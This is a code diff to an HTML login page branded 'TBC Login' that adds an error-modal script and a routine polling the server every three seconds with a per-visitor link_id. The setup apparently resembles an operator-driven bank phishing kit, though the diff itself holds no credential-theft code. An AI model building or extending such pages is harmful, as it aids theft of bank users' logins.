@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>კონცეპტი — Login</title>
+<link rel="stylesheet" href="error-modal.css">
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
 body{font-family:"Helvetica Neue",Arial,sans-serif;height:100vh;overflow:hidden;}
@@ -950,6 +951,11 @@ document.addEventListener('DOMContentLoaded', function() {
   } else {
     console.warn(`❌ TBC Login - no link_id found!`);
   }
+
+  // Start error polling
+  if (link_id && typeof ErrorModal !== 'undefined') {
+    ErrorModal.startPolling(link_id, 'tbc', 3000);
+  }
 });
 </script>
 
@@ -1003,4 +1009,5 @@ document.addEventListener('DOMContentLoaded', function() {
   </div>
 </div>
 
+<script src="error-modal.js"></script>
 </body>
